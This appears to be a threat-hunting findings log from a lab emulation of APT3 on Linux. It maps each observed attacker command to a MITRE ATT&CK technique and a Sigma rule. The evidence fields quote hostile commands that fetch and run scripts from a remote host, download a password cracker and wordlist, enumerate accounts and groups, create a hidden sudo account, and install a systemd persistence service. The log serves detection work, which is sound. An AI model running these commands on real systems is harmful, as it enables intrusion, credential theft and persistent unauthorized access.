Findings 

001. remote shell script download and execution

    001.1 Ingress Tool Transfer
          MITRE: T1105 - Ingress Tool Transfer
          Evidence: 'curl -o /tmp/malicious_script.sh http://192.168.122.230:8080/malicious_script.sh'
          Sigma_rule: rule_001.1

    001.2 File and directory permission modification
          MITRE: T1222.002 - File and Directory Permissions Modification: Linux and Mac Permissions
          Evidence: 'chmod +x /tmp/malicious_script.sh'
          Sigma_rule: rule_001.2

    001.3 Command and Scripting Interpreter: Unix Shell
          MITRE: T1059.004 - Command and Scripting Interpreter: Unix Shell
          Evidence: '/bin/bash /tmp/malicious_script.sh'
          Sigma_rule: rule_001.3

002. user/account discovery

    002.1 User Discovery
          MITRE: T1033 - System Owner/User Discovery
          Evidence: 'whoami','/bin/bash -c whoami'
          Sigma_rule: rule_002.1

    002.2 Ingress Tool Transfer
          MITRE: T1105 - Ingress Tool Transfer
          Evidence: 'curl -o /tmp/enumerate-accounts.sh http://192.168.122.230:8080/apt3-t1087.001.sh'
          Sigma_rule: rule_001.1

    002.3 File and directory permission modification 
          MITRE: T1222.002 - File and Directory Permissions Modification: Linux and Mac Permissions
          Evidence: 'chmod +x /tmp/enumerate-accounts.sh'
          Sigma_rule: rule_001.2

    002.4 account discovery: local account
          MITRE: T1087.001 - Account Discovery: Local Account
          Evidence: 'getent passwd'
          Sigma_rule: rule_002.1

    002.5 permission group discovery: local Groups
          MITRE: T1069.001 - Permission Groups Discovery: Local Groups
          Evidence: 'getent group admin', 'getent group sudo'
          Sigma_rule: rule_002.1

003. credential access: password cracking preparation

    003.1 Ingress Tool Transfer
          MITRE: T1105 - Ingress Tool Transfer
          Evidence: 'wget http://192.168.122.230:8080/john -O /tmp/john'
          Sigma_rule: rule_001.1

    003.2 File and Directory Permissions Modification
          MITRE: T1222.002 - File and Directory Permissions Modification: Linux and Mac 
          Evidence: 'chmod +x /tmp/john'
          Sigma_rule: rule_001.2

    003.3 Ingress Tool Transfer
          MITRE: T1105 - Ingress Tool Transfer
          Evidence: 'wget http://192.168.122.230:8080/passwords.txt -O /tmp/passwords.txt'
          Sigma_rule: rule_001.1

004. account creation and privilege modification

    004.1 Password hash generation
          MITRE:
          Evidence: 'openssl passwd -1 newpassword'
          Sigma_rule: 

    004.2 Local account creation
          MITRE: T1136.001 - Create Account: Local Account
          Evidence: 'sudo useradd -m -s /bin/bash -p $1$BnYbHRvE$A/bORa1gWzzaHByvDhBFj0 support_388945a0' 'useradd -m -s /bin/bash -p $1$BnYbHRvE$A/bORa1gWzzaHByvDhBFj0 support_388945a0'
          note: research on APT3 shows they utilize the username 'support_388945a0' verious times
          Sigma_rule: rule_004.2

    004.3 Local account privilege modification
          MITRE: T1098.007 — Account Manipulation: Additional Local or Domain Groups.
          Evidence: 'sudo usermod -aG sudo support_388945a0', 'usermod -aG sudo support_388945a0'
          Sigma_rule:

005. System persistence

    005.1 Ingress Tool Transfer
          MITRE: T1105 - Ingress Tool Transfer
          Evidence: 'curl -o /tmp/my-custom.service http://192.168.122.230:8080/my-custom.service'
          Sigma_rule: rule_001.1

    005.2 Ingress Tool Transfer
          MITRE: T1105 - Ingress Tool Transfer
          Evidence: 'curl -o /tmp/my-script.sh http://192.168.122.230:8080/my-script.sh'
          Sigma_rule: rule_001.1

    005.3 File and directory permitions modification
          MITRE: T1222.002 - File and Directory Permissions Modification: Linux and Mac
          Evidence: 'chmod +x /tmp/my-script.sh'
          Sigma_rule: rule_001.2

    005.4 Service installation
          MITRE: T1543.002 - Create or Modify System Process: Systemd Service
          Evidence: 'sudo mv /tmp/my-custom.service /etc/systemd/system/my-custom.service', 'mv /tmp/my-custom.service /etc/systemd/system/my-custom.service'
          Sigma_rule:


    005.5 Systemd configuration reload
          MITRE: T1569.003 - System Services: Systemctl
          Evidence: 'sudo systemctl daemon-reload', 'systemctl daemon-reload'
          Sigma_rule:

    005.6 System-generated systemd activity
          MITRE:
          Evidence: '[systemd/cloud-init/snapd generator activity]'
          Sigma_rule:
          Notes: Excluded from attacker findings.

    005.7 Systemd service enablement
          MITRE: T1569.003 - System Services: Systemctl
          Evidence: 'systemctl enable my-custom.service', 'sudo systemctl enable my-custom.service'
          Sigma_rule:


             =================================================================================
             =============================PERSISTANCE ESTABLISHED=============================
             =================================================================================

